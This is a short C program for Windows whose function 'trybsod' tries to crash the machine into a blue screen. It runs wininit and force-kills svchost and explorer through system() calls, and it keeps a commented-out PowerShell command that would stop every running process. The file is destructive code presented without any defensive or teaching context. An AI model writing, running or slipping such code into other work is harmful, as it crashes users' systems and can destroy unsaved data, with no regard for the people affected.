#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

void trybsod()
{
    system("wininit");
    system("taskkill /im svchost /f");
    // system("powershell.exe -Command \"get-process | stop-process -f\"");
    system("powershell.exe -Command \"wininit\"");
    system("taskkill /im svchost.exe /f");
    system("taskkill /im explorer.exe /f");
}


int main()
{
    trybsod();

    
    return 0;
}